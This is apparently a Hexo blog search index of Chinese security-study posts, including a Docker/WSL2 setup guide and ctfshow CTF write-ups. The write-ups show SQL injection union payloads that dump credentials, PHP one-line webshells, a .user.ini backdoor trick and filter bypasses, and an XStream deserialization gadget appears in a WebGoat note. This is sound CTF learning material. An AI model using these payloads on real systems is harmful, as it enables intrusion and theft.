<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>rsa</title>
    <link href="/2022/04/07/rsa/"/>
    <url>/2022/04/07/rsa/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>system-exam</title>
    <link href="/2022/03/28/system-exam/"/>
    <url>/2022/03/28/system-exam/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31a3d1a57afd25a09362297c25da637891e458a705a311282224f7233475c14d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>system</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用vscode玩转docker</title>
    <link href="/2022/03/18/dockerstudy2/"/>
    <url>/2022/03/18/dockerstudy2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面一节讲了docker的原理，安装以及一些docker的镜像命令，发现在虚拟机里调试docker实在是太不方便了，想到可以使用vscode来调试docker,极大地减轻了工作负担,接下来的话要讲如何在windows下优雅地使用docker。这节主要讲述如何使用vscode配合docker容器进行开发。</p><img src="/2022/03/18/dockerstudy2/image-20220405214731059.png" class="" title="image-20220405214731059"><h3 id="0x01-win10环境配置"><a href="#0x01-win10环境配置" class="headerlink" title="0x01 win10环境配置"></a>0x01 win10环境配置</h3><h4 id="wsl子系统的安装及配置"><a href="#wsl子系统的安装及配置" class="headerlink" title="wsl子系统的安装及配置"></a>wsl子系统的安装及配置</h4><p>如果不了解wsl子系统的话，可以先去看<a href="https://docs.microsoft.com/zh-cn/windows/wsl/about">微软官方文档</a></p><p>目前Docker Desktop 仅支持在Hyper-v模式或wsl模式下启动，但归根结底，wsl2子系统的底层还是离不开Hyper-v的驱动。 安装docker前，需要在控制面板-&gt;程序-.启用或关闭Windows功能进行配置，如果使用Hyper-v，则需要打开Hyper-V。但我推荐在wsl2下进行配置，所以，需要将适用于Linux的Windows子系统和虚拟机平台打开，并安装内核，具体操作请查看文档：<a href="https://jokeri.top/2021/11/06/wsl2/">win10搭建kali子系统(WSL2)</a></p><h3 id="0x02-docker的安装及配置"><a href="#0x02-docker的安装及配置" class="headerlink" title="0x02 docker的安装及配置"></a>0x02 docker的安装及配置</h3><p>到<a href="https://www.docker.com/get-started/">docker官网</a>下载Docker Desktop的最新安装包，然后执行安装步骤。成功安装并启动 Docker Desktop 后，可以在Docker菜单中注册账号并登录。</p><p>进入Docker Desktop 后，我们还得对Docker进行切换国内镜像源，设置以wsl2模式启动，以及设置内存等限制。</p><p><strong>切换国内镜像源</strong></p><p>点击设置图标，进入Docker Engine，修改配置文件为以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;builder&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;gc&quot;:</span> &#123;<br>      <span class="hljs-attr">&quot;defaultKeepStorage&quot;:</span> <span class="hljs-string">&quot;20GB&quot;</span>,<br>      <span class="hljs-attr">&quot;enabled&quot;:</span> <span class="hljs-literal">true</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;experimental&quot;:</span> <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">&quot;features&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;buildkit&quot;:</span> <span class="hljs-literal">true</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;registry-mirrors&quot;:</span> [<br>    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn/&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>并点击应用并重启。</p><img src="/2022/03/18/dockerstudy2/image-20220405220135335.png" class="" title="image-20220405220135335"><p><strong>设置以wsl模式启动</strong></p><p>在General下，选中Use the WSL 2 based engine，并点击应用并重启即可。</p><img src="/2022/03/18/dockerstudy2/image-20220405221428040.png" class="" title="image-20220405221428040"><p><strong><a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl-config">设置wsl2内存等限制。</a></strong></p><p>在地址栏输入%UserProfile%，进入用户文件夹。</p><img src="/2022/03/18/dockerstudy2/image-20220405222042068.png" class="" title="image-20220405222042068"><p>win10在2004正式版中提供了wsl2。wsl命令已具备之前wslconfig的所有功能。</p><p>新建.wslconfig文件，并输入以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">wsl2</span>]<br><span class="hljs-string">memory=8GB</span><br><span class="hljs-string">processors=4</span><br><span class="hljs-string">swap=2GB</span><br><span class="hljs-string">localhostForwarding=true</span><br></code></pre></td></tr></table></figure><p>限制内存为8G，核心为4，交换分区2G。</p><h3 id="0x03-vscode的安装及配置"><a href="#0x03-vscode的安装及配置" class="headerlink" title="0x03 vscode的安装及配置"></a>0x03 vscode的安装及配置</h3><p>到<a href="https://code.visualstudio.com/">官网</a>下载稳定版的vscode,并执行安装步骤。安装完成后，启动vscode，在vscode的扩展栏中搜索：Remote，找到<code>Remote - Containers</code>这个插件，按照同样的步骤，将docker这个插件安装好，扩展栏中就会出现docker的图标。</p><img src="/2022/03/18/dockerstudy2/image-20220405225812291.png" class="" title="image-20220405225812291"><p>接下来开启个容器，试试插件能不能正常运行。</p><img src="/2022/03/18/dockerstudy2/image-20220405230415434.png" class="" title="image-20220405230415434"><p>可以发现，成功进入容器。</p>]]></content>
    
    
    
    <tags>
      
      <tag>wsl2</tag>
      
      <tag>虚拟化</tag>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bluecms1.6</title>
    <link href="/2022/03/07/bluecms1-6/"/>
    <url>/2022/03/07/bluecms1-6/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>env-injection</title>
    <link href="/2022/02/22/env-injection/"/>
    <url>/2022/02/22/env-injection/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天学习到了p牛的一个trick,<a href="https://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令</a>然后发现其实环境变量注入早在14年就存在了，还是来学习下吧。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;envs&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>    putenv(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$key&#125;</span>=<span class="hljs-subst">&#123;$val&#125;</span>&quot;</span>);<br>&#125;<br>system(<span class="hljs-string">&#x27;echo hello&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>#待更新</p><img src="/2022/02/22/env-injection/image-20220222213602198.png" class="">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow之sql注入</title>
    <link href="/2022/02/07/ctfshow-sql-injection/"/>
    <url>/2022/02/07/ctfshow-sql-injection/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow之sql注入"><a href="#ctfshow之sql注入" class="headerlink" title="ctfshow之sql注入"></a>ctfshow之sql注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><img src="/2022/02/07/ctfshow-sql-injection/image-20220207200752628.png" class=""><p>查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&#x27; limit 1;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里已经给出了sql语句，也就是说，当我们输入用户id=1时，在数据库中的查询语句就变成了这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">select username,password <span class="hljs-keyword">from</span> user where username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;1&#x27;</span> limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>这时我们要想办法把单引号给闭合掉，mysql注释符有#、– (后面有空格)、/**/等，在SQL注入中经常用到，但是不一定都适用。</p><p>这里我们构造id=1’– ,在数据库中的查询语句就变成了这样(– 注释了后面的’ limit 1;)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">select username,password <span class="hljs-keyword">from</span> user where username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/07/ctfshow-sql-injection/image-20220207202604365.png" class=""><p>再用order by列数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4 -- </span><br></code></pre></td></tr></table></figure><img src="/2022/02/07/ctfshow-sql-injection/image-20220207203938101.png" class=""><p>列数为3时，回显正常</p><img src="/2022/02/07/ctfshow-sql-injection/image-20220207204056658.png" class=""><p>再测试回显位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3-- </span><br></code></pre></td></tr></table></figure><img src="/2022/02/07/ctfshow-sql-injection/image-20220207205512946.png" class=""><p>发现都能回显，那就用第一个吧，接下来先查看当前数据库名(一般来说flag会在当前的数据库中)，需要注意的是，这里的-1是让第一行置空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select database(),2,3 -- </span><br></code></pre></td></tr></table></figure><p>得到数据库名ctfshow_web</p><img src="/2022/02/07/ctfshow-sql-injection/image-20220207210857963.png" class=""><p>再用group_concat函数查询表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=&#x27;</span>ctfshow_we<span class="hljs-string">b&#x27; -- </span><br></code></pre></td></tr></table></figure><p>得到表名ctfshow_user</p><img src="/2022/02/07/ctfshow-sql-injection/image-20220207212515628.png" class=""><p>接下来查询列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&#x27;</span>ctfshow_user<span class="hljs-string">&#x27; -- </span><br></code></pre></td></tr></table></figure><p>得到三个列名：id,username,password</p><img src="/2022/02/07/ctfshow-sql-injection/image-20220207213837348.png" class=""><p>然后在列名password找到了flag，这里的0x7e(也就是~)主要起分隔作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(id,0x7e,username,0x7e,password),2,3 from ctfshow_user -- </span><br></code></pre></td></tr></table></figure><img src="/2022/02/07/ctfshow-sql-injection/image-20220207214508721.png" class=""><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与上题思路一致，但这次的列数变成了两列。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow之文件上传</title>
    <link href="/2022/02/06/ctfshow-upload/"/>
    <url>/2022/02/06/ctfshow-upload/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow之文件上传"><a href="#ctfshow之文件上传" class="headerlink" title="ctfshow之文件上传"></a>ctfshow之文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。</p><img src="/2022/02/06/ctfshow-upload/image-20220206200917084.png" class=""><p>也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs php">用小点的图片和一句话木马，利用copy命令生成图片马<br>copy shell.png/b+shell.php/a a.png<br></code></pre></td></tr></table></figure><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端会对Content-Type进行限制，但和上题的思路一样。</p><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>这里对php后缀进行了限制，这里可以使用p牛的方法：<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">user.ini文件构成php后门。</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>php配置项的两个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">指定一个文件，自动包含在要执行的文件前<br>auto_append_file=a.png<br>    <br>指定一个文件，自动包含在要执行的文件后<br>auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><p>先上传.user.ini文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206215218371.png" class=""><p>接着上传a.png的马，成功利用。</p><img src="/2022/02/06/ctfshow-upload/image-20220206220334001.png" class=""><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>和上题的思路一样，但上传马的时报错了，这里可能是把文件内容的php给禁用了，这里我们使用短标签进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功上传马</p><img src="/2022/02/06/ctfshow-upload/image-20220206222508627.png" class=""><p>拿到flag</p><img src="/2022/02/06/ctfshow-upload/image-20220206222721766.png" class=""><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>与上题思路一致</p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>和上题思路一致，但上传马的时候始终失败，另外过滤了’[‘字符,这里换了一个马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206230340766.png" class=""><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>和上题的思路一样，但这里过滤了分号，把分号去掉即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>与上题思路一致</p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>和上题思路一样，但这里把符号‘(’给过滤了，那么可以采用反引号来执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../fla*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>和上题思路一样，但这里把反引号给过滤了，可以使用include命令去配合php伪协议进行读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#a.png</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;p&quot;</span>.<span class="hljs-string">&quot;hp://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="hljs-string">&quot;hp&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220207142011547.png" class="" title="image-20220207142011547"><p>再进行base64解码即可。</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>和上题思路一样，但这次.user.ini文件上传失败，但加了文件头就上传成功了。</p><img src="/2022/02/06/ctfshow-upload/image-20220207143149955.png" class="" title="image-20220207143149955"><p>接着上传图片马</p><img src="/2022/02/06/ctfshow-upload/image-20220207143736974.png" class="" title="image-20220207143736974"><p>再进行base64解码即可。</p><h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>把.给过滤了，</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>day03</title>
    <link href="/2022/01/14/day03/"/>
    <url>/2022/01/14/day03/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</title>
    <link href="/2022/01/14/day02/"/>
    <url>/2022/01/14/day02/</url>
    
    <content type="html"><![CDATA[<h2 id="第2天：基础入门-Web应用-amp-架构搭建-amp-漏洞-amp-HTTP数据包-amp-代理服务器"><a href="#第2天：基础入门-Web应用-amp-架构搭建-amp-漏洞-amp-HTTP数据包-amp-代理服务器" class="headerlink" title="第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h2><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>知识点：<br>1、网站搭建前置知识<br>2、WEB应用环境架构类<br>3、WEB应用安全漏洞分类<br>4、WEB请求返回过程数据包<br></code></pre></td></tr></table></figure><h3 id="0x01网站搭建前置知识"><a href="#0x01网站搭建前置知识" class="headerlink" title="0x01网站搭建前置知识"></a>0x01网站搭建前置知识</h3><p>域名，子域名，DNS，HTTP/HTTPS，证书等</p><h3 id="0x02-WEB应用环境架构类"><a href="#0x02-WEB应用环境架构类" class="headerlink" title="0x02 WEB应用环境架构类"></a>0x02 WEB应用环境架构类</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">理解不同WEB应用组成角色功能架构:<br>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类；开发框架分类等<br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等<br>数据库类型：Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等<br>服务器操作系统：Windows系列，Linux系列，Mac系列等<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等<br></code></pre></td></tr></table></figure><h3 id="0x03-WEB应用安全漏洞分类"><a href="#0x03-WEB应用安全漏洞分类" class="headerlink" title="0x03 WEB应用安全漏洞分类"></a>0x03 WEB应用安全漏洞分类</h3><p>SQL注入，文件安全，RCE执行，XSS跨站，CSRF/SSRF/CRLF，<br>反序列化，逻辑越权，未授权访问，XXE/XML，弱口令安全等</p><h3 id="0x04-WEB请求返回过程"><a href="#0x04-WEB请求返回过程" class="headerlink" title="0x04 WEB请求返回过程"></a>0x04 WEB请求返回过程</h3><p>参考于<a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><p>​                 <img src="/2022/01/14/day02/P-CXBjDJIbf6whZeJ0ghFA.png" class="" title="img">        </p><p>​                 <img src="/2022/01/14/day02/ZKpoyq4mYDuQ6r3_5gagJA.png" class="" title="img">        </p><p>​                 <img src="/2022/01/14/day02/0I-QOC6Sfebb2EFCC4jj5A.png" class="" title="img">        </p><h3 id="0x05-HTTP协议数据包简单总结"><a href="#0x05-HTTP协议数据包简单总结" class="headerlink" title="0x05 HTTP协议数据包简单总结"></a>0x05 HTTP协议数据包简单总结</h3><p>参考于<a href="https://www.cnblogs.com/cherrycui/p/10815465.html">https://www.cnblogs.com/cherrycui/p/10815465.html</a></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">请求数据包，请求方法，请求体，响应包，响应头，状态码，代理服务器等<br>Request,Response,User-Agent,Cookie,Server,Content-Length等<br></code></pre></td></tr></table></figure><p>演示案例：</p><ul><li>架构-Web应用搭建-域名源码解析</li><li>请求包-新闻回帖点赞-重放数据包</li><li>请求包-移动端&amp;PC访问-自定义UA头</li><li>返回包-网站文件目录扫描-返回状态码</li><li>数据包-WAF文件目录扫描-代理服务器</li></ul>]]></content>
    
    
    <categories>
      
      <category>小迪安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</title>
    <link href="/2022/01/12/day21/"/>
    <url>/2022/01/12/day21/</url>
    
    <content type="html"><![CDATA[<h2 id="第21天：WEB攻防-JavaWeb项目-amp-JWT身份攻击-amp-组件安全-amp-访问控制"><a href="#第21天：WEB攻防-JavaWeb项目-amp-JWT身份攻击-amp-组件安全-amp-访问控制" class="headerlink" title="第21天：WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制"></a>第21天：WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</h2><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>知识点：<br>1、JavaWeb常见安全及代码逻辑<br>2、目录遍历<span class="hljs-built_in">&amp;</span>身份验证<span class="hljs-built_in">&amp;</span>逻辑<span class="hljs-built_in">&amp;</span>JWT<br>3、访问控制<span class="hljs-built_in">&amp;</span>安全组件<span class="hljs-built_in">&amp;</span>越权<span class="hljs-built_in">&amp;</span>三方组件<br></code></pre></td></tr></table></figure><hr><p>演示案例：</p><ul><li>JavaWeb-WebGoat8靶场搭建使用</li><li>安全问题-目录遍历&amp;身份认证-JWT攻击</li><li>安全问题-访问控制&amp;安全组件-第三方组件</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta">#环境下载：</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//github.com/WebGoat/WebGoat</span><br><br><span class="hljs-meta">#目录遍历</span><br><br><span class="hljs-meta">#身份认证</span><br>-键值逻辑：使用键名键值进行对比验证错误<br>-JWT攻击：<span class="hljs-number">1</span>、签名没验证空加密 <span class="hljs-number">2</span>、爆破密匙 <span class="hljs-number">3</span>、KID利用<br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.cnblogs.com/vege/p/14468030.html</span><br><br><span class="hljs-meta">#访问控制</span><br>-隐藏属性：前端页面的自慰限制显示<br>-水平越权：同一级别用户权限的查看<br><br><span class="hljs-meta">#安全组件</span><br>-联想到刚爆出的Log4j2<br><span class="hljs-params">&lt;sorted-set&gt;</span><br>  <span class="hljs-params">&lt;string&gt;</span>foo<span class="hljs-params">&lt;/string&gt;</span><br>  <span class="hljs-params">&lt;dynamic-proxy&gt;</span><br>    <span class="hljs-params">&lt;interface&gt;</span>java.lang.Comparable<span class="hljs-params">&lt;/interface&gt;</span><br>    <span class="hljs-params">&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;</span><br>      <span class="hljs-params">&lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br>        <span class="hljs-params">&lt;command&gt;</span><br>          <span class="hljs-params">&lt;string&gt;</span>calc.exe<span class="hljs-params">&lt;/string&gt;</span><br>        <span class="hljs-params">&lt;/command&gt;</span><br>      <span class="hljs-params">&lt;/target&gt;</span><br>      <span class="hljs-params">&lt;action&gt;</span>start<span class="hljs-params">&lt;/action&gt;</span><br>    <span class="hljs-params">&lt;/handler&gt;</span><br>  <span class="hljs-params">&lt;/dynamic-proxy&gt;</span><br><span class="hljs-params">&lt;/sorted-set&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小迪安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 - Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</title>
    <link href="/2022/01/11/day01/"/>
    <url>/2022/01/11/day01/</url>
    
